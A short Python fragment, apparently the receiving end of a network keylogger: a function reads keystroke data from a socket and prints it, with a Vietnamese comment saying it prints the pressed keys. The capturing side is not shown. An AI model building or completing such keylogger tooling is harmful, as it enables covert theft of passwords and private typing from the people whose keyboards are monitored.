import keyboard

def receive_key_loggers(client_socket):
    while True:
        try:
            data = client_socket.recv(1024).decode()
            if not data:
                break
            print(data, end='', flush=True)  # In ra phím nhấn
        except ConnectionResetError:
            print("Server disconnected.")
            break
